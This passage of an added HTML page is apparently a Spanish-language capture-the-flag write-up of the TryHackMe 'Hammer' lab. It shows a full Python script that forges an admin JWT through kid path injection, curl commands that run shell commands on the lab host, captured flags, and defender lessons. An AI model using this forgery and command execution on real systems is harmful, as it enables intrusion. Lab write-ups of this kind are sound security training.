+    "user_id": 1,
+    "email": "tester@hammer.thm",
+    "role": "user"
+  }
+}</div>
+    <div class="interpret-box"><strong>Hallazgo crítico — el campo kid</strong><p><code>kid</code> (Key ID) le dice al servidor qué archivo del filesystem usar como clave HMAC para verificar la firma. Si encontramos un archivo cuyo contenido conozcamos, podemos forjar tokens válidos con cualquier payload.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 11 — Identificar la clave conocida</div>
+    <h3>188ade1.key visible en el dashboard</h3>
+    <p>El listado de archivos del dashboard expone <code>188ade1.key</code>. Lo leemos a través de la interfaz web:</p>
+    <div class="output-label">contenido de 188ade1.key</div>
+    <div class="output-box">56058354efb3daa97ebab00fabd7a7d7</div>
+    <div class="decision-box"><strong>Plan</strong><p>Apuntamos <code>kid</code> a <code>/var/www/html/188ade1.key</code> y firmamos el JWT con <code>56058354efb3daa97ebab00fabd7a7d7</code>. El servidor leerá ese archivo, validará la firma y aceptará el payload con <code>role: admin</code>.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 12 — Forja del JWT admin</div>
+    <h3>Script Python para construir y firmar el token</h3>
+    <div class="why-box"><strong>¿Por qué funciona?</strong><p>El servidor confía ciegamente en el <code>kid</code> del cliente. Una implementación segura usaría una clave hardcoded o validaría <code>kid</code> contra un whitelist estricto.</p></div>
+    <div class="cmd-annotated"><pre><span class="comment-c">#!/usr/bin/env python3</span>
+<span class="cmd">import</span> json, base64, hmac, hashlib
+
+KEY = <span class="str-c">"56058354efb3daa97ebab00fabd7a7d7"</span>  <span class="comment-c"># clave conocida</span>
+
+<span class="cmd">def</span> b64url(data):
+    <span class="cmd">if</span> isinstance(data, str): data = data.encode()
+    <span class="cmd">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="str-c">b'='</span>).decode()
+
+header = {
+    <span class="str-c">"typ"</span>: <span class="str-c">"JWT"</span>,
+    <span class="str-c">"alg"</span>: <span class="str-c">"HS256"</span>,
+    <span class="str-c">"kid"</span>: <span class="str-c">"/var/www/html/188ade1.key"</span>  <span class="comment-c"># ← ruta conocida</span>
+}
+
+payload = {
+    <span class="str-c">"iss"</span>: <span class="str-c">"http://hammer.thm"</span>,
+    <span class="str-c">"aud"</span>: <span class="str-c">"http://hammer.thm"</span>,
+    <span class="str-c">"iat"</span>: server_iat,    <span class="comment-c"># iat real del servidor</span>
+    <span class="str-c">"exp"</span>: server_iat + 3600,
+    <span class="str-c">"data"</span>: {
+        <span class="str-c">"user_id"</span>: 1,
+        <span class="str-c">"email"</span>: <span class="str-c">"tester@hammer.thm"</span>,
+        <span class="str-c">"role"</span>: <span class="str-c">"admin"</span>   <span class="comment-c"># ← escalada</span>
+    }
+}
+
+h = b64url(json.dumps(header, separators=(<span class="str-c">','</span>,<span class="str-c">':'</span>)))
+p = b64url(json.dumps(payload, separators=(<span class="str-c">','</span>,<span class="str-c">':'</span>)))
+sig = hmac.new(KEY.encode(), <span class="str-c">f"{h}.{p}"</span>.encode(), hashlib.sha256).digest()
+forged_jwt = <span class="str-c">f"{h}.{p}.{b64url(sig)}"</span></pre></div>
+    <div class="interpret-box"><strong>Nota sobre iat</strong><p>El servidor exige que <code>iat</code> coincida con el del login activo. Si usamos un timestamp distinto devuelve <em>"Cannot handle token with iat prior to..."</em>. Solución: extraer el <code>iat</code> del JWT real y reusarlo.</p></div>
+  </div>
+</div>
+
+<!-- 06 RCE -->
+<div class="section" id="rce">
+  <h2>6. Ejecución remota de comandos — Flag 2</h2>
+
+  <div class="step-box">
+    <div class="step-number">PASO 13 — Usar el JWT forjado</div>
+    <h3>POST a execute_command.php con Bearer token admin</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="cmd">curl</span> <span class="flag-opt">-s</span> <span class="param">http://10.128.167.188:1337/execute_command.php</span> \
+  <span class="flag-opt">-X</span> POST \
+  <span class="flag-opt">-H</span> <span class="str-c">"Content-Type: application/json"</span> \
+  <span class="flag-opt">-H</span> <span class="str-c">"Authorization: Bearer $FORGED_JWT"</span> \
+  <span class="flag-opt">-b</span> <span class="str-c">"PHPSESSID=$SESS; persistentSession=yes"</span> \
+  <span class="flag-opt">-d</span> <span class="str-c">'{"command": "id"}'</span></div></div>
+    <div class="output-label">output</div>
+    <div class="output-box">{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}</div>
+    <div class="interpret-box"><strong>RCE confirmado</strong><p>Ejecución como <code>www-data</code> — el usuario típico de Apache en Ubuntu/Debian.</p></div>
+  </div>
+
+  <div class="step-box">
+    <div class="step-number">PASO 14 — Captura de la Flag 2</div>
+    <h3>Localizar y leer flag.txt</h3>
+    <div class="cmd-annotated"><div class="cmd-line"><span class="comment-c"># Buscar flag.txt</span>
+<span class="cmd">curl</span> ... <span class="flag-opt">-d</span> <span class="str-c">'{"command": "find / -name flag.txt 2&gt;/dev/null"}'</span>
+<span class="comment-c"># → /home/ubuntu/flag.txt</span>
+
+<span class="cmd">curl</span> ... <span class="flag-opt">-d</span> <span class="str-c">'{"command": "cat /home/ubuntu/flag.txt"}'</span></div></div>
+    <div class="output-label">output</div>
+    <div class="output-box">{"output":"THM{RUNANYCOMMAND1337}\n"}</div>
+  </div>
+</div>
+
+<!-- 07 VULNS -->
+<div class="section" id="vulns">
+  <h2>7. Análisis de vulnerabilidades</h2>
+  <div class="vuln-grid">
+    <div class="vuln-card">
+      <h3>Directory Listing + Log Exposure</h3>
+      <p><code>hmr_logs/</code> tiene listing habilitado y <code>error.logs</code> expone emails reales, rutas del sistema y fallos históricos sin autenticación.</p>
+      <span class="vuln-sev med">MEDIUM — CWE-532</span>
+    </div>
+    <div class="vuln-card">
+      <h3>Rate Limit Bypass via X-Forwarded-For</h3>
+      <p>El rate limit confía en <code>X-Forwarded-For</code> para identificar al cliente. Como la cabecera la controla el atacante, el control es trivialmente bypasseable.</p>
+      <span class="vuln-sev">HIGH — CWE-799</span>
+    </div>
+    <div class="vuln-card">
+      <h3>Weak OTP — 4 dígitos sin lockout real</h3>
+      <p>Solo 10.000 combinaciones. Combinado con el bypass de rate limit, se fuerza en segundos con 50 hilos paralelos dentro de la ventana de 180 s.</p>
+      <span class="vuln-sev">HIGH — CWE-307</span>
+    </div>
+    <div class="vuln-card">
+      <h3>JWT kid Path Traversal / Key Confusion</h3>
+      <p>El servidor acepta <code>kid</code> sin validación, permitiendo apuntar a cualquier archivo del filesystem como clave HMAC. Si su contenido es conocido, se forjan tokens con cualquier role.</p>
+      <span class="vuln-sev crit">CRITICAL — CWE-347</span>
+    </div>
+  </div>
+</div>
+
+<!-- 08 LESSONS -->
+<div class="section" id="lecciones">
+  <h2>8. Lecciones aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔️ Para el atacante</h4>
+      <ul>
+        <li>Comentarios HTML en producción revelan convenciones — siempre leer el código fuente completo.</li>
+        <li>Cualquier rate limit por IP: probar X-Forwarded-For, X-Real-IP, X-Client-IP, Forwarded.</li>
+        <li>OTPs cortos son forzables si no hay lockout real. Multithreading es clave.</li>
+        <li>El campo <code>kid</code> del JWT siempre se decodifica y se busca como ruta.</li>
+        <li>Cookies con expiración corta (<code>persistentSession</code>) son control de UX, no de seguridad — el backend valida JWT.</li>
+        <li>El <code>iat</code> puede tener validación servidor — extraer el real y reutilizarlo.</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡️ Para el defensor</h4>
+      <ul>
+        <li>Nunca exponer logs públicamente. <code>Options -Indexes</code> y <code>Require all denied</code>.</li>
+        <li>Rate limit a nivel de red (iptables, fail2ban, WAF), nunca confiando en cabeceras del cliente.</li>
+        <li>OTPs de 6+ dígitos con lockout permanente tras N intentos, independiente de la IP.</li>
+        <li>JWT: clave hardcoded en variables de entorno. <code>kid</code> validado contra whitelist estricto, jamás como ruta.</li>
+        <li>Nunca colocar archivos <code>*.key</code> bajo el document root.</li>
+        <li>Eliminar todos los comentarios de desarrollo del HTML antes de producción.</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 style="margin-top:2rem;color:var(--green);font-family:var(--mo);font-size:.85rem;letter-spacing:1px;text-transform:uppercase;">Diagrama de la cadena de ataque</h3>
+  <div class="ascii-diagram">ATTACKER                          SERVER (port 1337)
+─────────────────────────────────────────────────────────
+
+[1] GET /hmr_logs/error.logs  ──► [Apache · directory listing]
+                              ◄── email: tester@hammer.thm
+
+[2] POST /reset_password.php  ──► [PHP · genera OTP 4 dígitos]
+    {email: tester@hammer.thm}     [rate limit: 10/IP]
+                              ◄── PHPSESSID + Rate-Limit-Pending: 9
+
+[3] POST /reset_password.php  ──► [rate limit check]
+    {recovery_code: XXXX}          Lee X-Forwarded-For → BYPASS
+    X-Forwarded-For: 127.X.X.X    (10.000 intentos en ~20s)
+                              ◄── OTP correcto: redirige a nueva pass
+
+[4] POST / (login)            ──► [PHP · autentica · genera JWT]
+    {email, password}              kid = /var/www/mykey.key
+                              ◄── token=JWT{role:user} · persistentSession(20s)
+
+[5] GET /dashboard.php        ──► [lee JWT · verifica kid · role=user]
+                              ◄── Flag1: THM{AuthBypass3D}
+                                  [visible: 188ade1.key = 56058354...]
+
+[6] POST /execute_command.php ──► [verifica JWT Bearer]
+    JWT{kid:188ade1.key,           kid = /var/www/html/188ade1.key ◄ FORJADO
+        role:admin}                firma HMAC con clave conocida
+                              ◄── {"output":"uid=33(www-data)..."}
+
+[7] POST /execute_command.php ──► cat /home/ubuntu/flag.txt
+                              ◄── Flag2: THM{RUNANYCOMMAND1337}
+
+    MÁQUINA COMPROMETIDA ✓</div>
+</div>
+
+</main>
+
+<!-- ═══ SIDEBAR ═══ -->
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">Hammer</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">TryHackMe</span></div>
+    <div class="meta-row"><span class="meta-label">Categoría</span><span class="meta-value">Web App</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:#f5a623;">Medium</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux Ubuntu</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.128.167.188</span></div>
+    <div class="meta-row"><span class="meta-label">Puerto</span><span class="meta-value">1337/tcp</span></div>
+    <div class="meta-row"><span class="meta-label">Stack</span><span class="meta-value">Apache · PHP · JWT</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-04-17</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Skills Aplicadas</h4>
+    <div class="skill-bar"><div class="skill-bar-label"><span>Web Recon</span><span>85%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" style="width:85%"></div></div></div>
+    <div class="skill-bar"><div class="skill-bar-label"><span>JWT Attacks</span><span>92%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" style="width:92%"></div></div></div>
+    <div class="skill-bar"><div class="skill-bar-label"><span>HTTP Header Abuse</span><span>88%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" style="width:88%"></div></div></div>
+    <div class="skill-bar"><div class="skill-bar-label"><span>Multithread Brute</span><span>80%</span></div><div class="skill-bar-track"><div class="skill-bar-fill" style="width:80%"></div></div></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div class="tool-row"><span class="tool-name">nmap</span><span class="tool-desc">Recon TCP + version</span></div>
+    <div class="tool-row"><span class="tool-name">curl</span><span class="tool-desc">Manipulación HTTP cruda</span></div>
+    <div class="tool-row"><span class="tool-name">python3</span><span class="tool-desc">Brute multithread + JWT forge</span></div>
+    <div class="tool-row"><span class="tool-name">jwt_tool</span><span class="tool-desc">Análisis del token</span></div>
+    <div class="tool-row"><span class="tool-name">base64</span><span class="tool-desc">Decode header/payload</span></div>
+    <div class="tool-row"><span class="tool-name">hmac/hashlib</span><span class="tool-desc">Firma HS256</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1110.001</span>
+    <span class="mitre-tag">T1556</span>
+    <span class="mitre-tag">T1606.001</span>
+    <span class="mitre-tag">T1059.004</span>
+    <span class="mitre-tag">T1552.001</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <a class="toc-link" href="#resumen">Resumen Ejecutivo</a>
+    <a class="toc-link" href="#recon">1. Reconocimiento</a>
+    <a class="toc-link" href="#logs">2. Fuga en logs</a>
+    <a class="toc-link" href="#otp">3. Brute OTP + XFF bypass</a>
+    <a class="toc-link" href="#dashboard">4. Dashboard — Flag 1</a>
+    <a class="toc-link" href="#jwt">5. JWT kid Injection</a>
+    <a class="toc-link" href="#rce">6. RCE — Flag 2</a>
+    <a class="toc-link" href="#vulns">7. Vulnerabilidades</a>
+    <a class="toc-link" href="#lecciones">8. Lecciones</a>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flags Capturadas</h4>
+    <div style="background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.2);border-radius:8px;padding:.7rem;text-align:center;margin-bottom:.5rem;">
+      <div style="font-size:.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">Flag 1 — Dashboard</div>
+      <div style="font-family:var(--mo);font-size:.7rem;color:var(--blue);word-break:break-all;font-weight:700;">THM{AuthBypass3D}</div>
+    </div>
+    <div style="background:rgba(0,232,122,.08);border:1px solid rgba(0,232,122,.2);border-radius:8px;padding:.7rem;text-align:center;">
+      <div style="font-size:.62rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.4rem;">Flag 2 — RCE</div>
+      <div style="font-family:var(--mo);font-size:.7rem;color:var(--green);word-break:break-all;font-weight:700;">THM{RUNANYCOMMAND1337}</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Cadena de Ataque</h4>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.72rem;">
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">1. nmap → puerto 1337</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text2);font-family:var(--mo);">2. hmr_logs → email</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--orange);color:var(--text2);font-family:var(--mo);">3. XFF bypass → OTP</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text2);font-family:var(--mo);">4. Login → JWT user</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--purple);color:var(--text2);font-family:var(--mo);">5. kid injection → admin</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--green);color:var(--green);font-family:var(--mo);font-weight:700;">6. RCE → www-data ✅</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Ghost-Ops Score</h4>
+    <div class="score-num">4/4</div>
+    <div class="score-label">vulnerabilidades encadenadas</div>
+    <p style="font-size:0.72rem;color:var(--text3);text-align:center;margin-top:0.5rem;">Log exposure + XFF bypass + Weak OTP + JWT kid injection</p>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Glosario Rápido</h4>
+    <div class="glosario-item"><span class="glosario-term">JWT</span><span class="glosario-def">JSON Web Token. Header + payload + firma. Si la firma valida, se confía en el payload.</span></div>
+    <div class="glosario-item"><span class="glosario-term">kid</span><span class="glosario-def">Key ID — campo opcional del header JWT que indica qué clave usar. Vulnerable si no se valida.</span></div>
+    <div class="glosario-item"><span class="glosario-term">HS256</span><span class="glosario-def">HMAC-SHA256 — algoritmo simétrico para firmar JWTs. Si conoces la clave, firmas cualquier token.</span></div>
+    <div class="glosario-item"><span class="glosario-term">OTP</span><span class="glosario-def">One-Time Password. Vulnerable a brute si el espacio es pequeño y no hay lockout.</span></div>
+    <div class="glosario-item"><span class="glosario-term">X-Forwarded-For</span><span class="glosario-def">Cabecera que indica IP original del cliente. Nunca usar para seguridad sin validar el origen.</span></div>
+    <div class="glosario-item"><span class="glosario-term">Directory Listing</span><span class="glosario-def">Función del servidor web que muestra el contenido de un directorio. Deshabilitar en producción.</span></div>
+  </div>
+
+</aside>
+</div>
+
+<!-- ═══ FOOTER ═══ -->
+<footer style="background:var(--forest);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text3);font-size:.82rem;">TryHackMe · Hammer · Medium · Linux · Web App · 2026-04-17</p>
+  <p style="color:var(--text3);font-size:.78rem;margin-top:.35rem;">Reporte por <span style="color:var(--green);">heindall</span> · Cadena: hmr_logs → XFF bypass → OTP brute → JWT kid injection → RCE</p>
+</footer>
+
+<script src="https://unpkg.com/three@0.160.0/build/three.min.js"></script>
+<script>
+(function(){
+  var c=document.getElementById('heroOrb');if(!c)return;
+  var r=new THREE.WebGLRenderer({canvas:c,antialias:true,alpha:true});
+  r.setPixelRatio(Math.min(devicePixelRatio,2));r.setSize(260,260,false);
+  var s=new THREE.Scene(),cam=new THREE.PerspectiveCamera(58,1,0.1,100);cam.position.z=7.4;
+  var cfg=[[1.45,3,0.06],[2.1,1,0.03],[2.75,1,0.018]];
+  var sp=cfg.map(function(v){var m=new THREE.Mesh(new THREE.IcosahedronGeometry(v[0],v[1]),new THREE.MeshBasicMaterial({color:0x00e87a,wireframe:true,transparent:true,opacity:v[2]}));s.add(m);return m;});
+  var t=0;(function a(){requestAnimationFrame(a);t+=0.012;sp[0].rotation.y=t*0.35;sp[0].rotation.x=t*0.18;sp[1].rotation.y=-t*0.25;sp[1].rotation.z=t*0.15;sp[2].rotation.y=t*0.15;sp[2].rotation.z=-t*0.1;r.render(s,cam);})();
+})();
+</script>
+</body>
+</html>
